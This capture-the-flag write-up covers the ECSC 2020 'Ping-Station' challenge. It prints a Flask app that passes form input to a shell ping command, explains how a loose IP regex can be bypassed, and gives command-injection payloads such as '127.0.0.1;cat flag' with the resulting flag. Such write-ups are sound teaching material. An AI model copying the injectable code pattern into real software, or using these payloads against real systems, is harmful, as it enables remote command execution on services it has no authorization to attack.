# Ping-Station
## Statement
> Description
>> Just another ping service to audit.

> About the challenge
>> The challenge was initially published at European Cyber Security Challenge 2020 - the national phase organised in Romania. The challenge was created by Bit Sentinel.

>> European Cyber Security Challenge (ECSC) is the annual European event that brings together young talent from across Europe to have fun and compete in cybersecurity!

Author: **@Betaflash**

Login: http://34.159.73.xxx:32011

# Source-Code
```Python
from flask import Flask, render_template, url_for, request, redirect

import subprocess
import re
import string

app = Flask(__name__)

def is_valid_ip(ip):
    ipv = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\S{1,9})|(/s)\.(\d{1,3})$",ip)
    return bool(ipv) 

@app.route('/', methods=['POST', 'GET'])
def index():
    if request.method == 'POST':
        ip = request.form['content']
        if (is_valid_ip(ip)==True):
            for i in range(0,2):
                return '<pre>'+subprocess.check_output("ping -c 4 "+ip,shell=True).decode()+'</pre>'
                break
        else:
            return"That's not a valid IP"
    else:
        return render_template('index.html')

if __name__ == "__main__":
    app.run(host = "0.0.0.0")
```

## Analysis

When reaching the page with a GET request we encounter a simple webpage with a POST form.

We may try to reproduce a POST request and see what happens.

Using such request with a valid ip:
```http
POST / HTTP/1.1
Host: 34.159.73.xxx:32011
Content-Length: 20
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://34.159.73.xxx:32011
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://34.159.73.xxx:32011/
Accept-Encoding: gzip, deflate, br
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

content=174.xxx.4.22
```
We get the following response:
```http
HTTP/1.0 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 290
Server: Werkzeug/1.0.1 Python/3.5.2
Date: Thu, 09 May 2024 09:10:11 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Now let's look a little bit further on the code.

If our payload is confirmed, the server will execute this whole command: "ping -c 4 "+ip

Which means if we add a valid command in ip affter the ping command, it should be executed.

To be valid, the parameter `ip` should satisfy this following condition: ```re.match(r"^(\d{1,3})\.(\d{1,3})\.(\S{1,9})|(/s)\.(\d{1,3})$",ip)```.

The problem in this regex are the `\S{1,9}` caracters which gives us some free space to work with, and the `|` which separates the first and second sequence, which means our sequence doesn't have to end with numbers while it matches the first part (before |).

In fact if our parameter starts with a valid sequence 127.0. and any 9 caracters sequence, it should be validated.

## Exploitation

I tryed using `content=127.0.0.1;ls` which worked, reveling a `flag` file in the current directory

Then, `content=127.0.0.1;cat flag`also matches, because `content=127.0.0.1;cat` is a valid sequence.

This payload gives us the flag:
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 81
Server: Werkzeug/1.0.1 Python/3.5.2
Date: Thu, 09 May 2024 09:35:15 GMT

<pre>ECSC{b1c0bc8e5e1b4c81199ad3c41bef8b69bea3ab86ecfb08c211d90ace0ff98df3}</pre>
```

Flag: **ECSC{b1c0bc8e5e1b4c81199ad3c41bef8b69bea3ab86ecfb08c211d90ace0ff98df3}**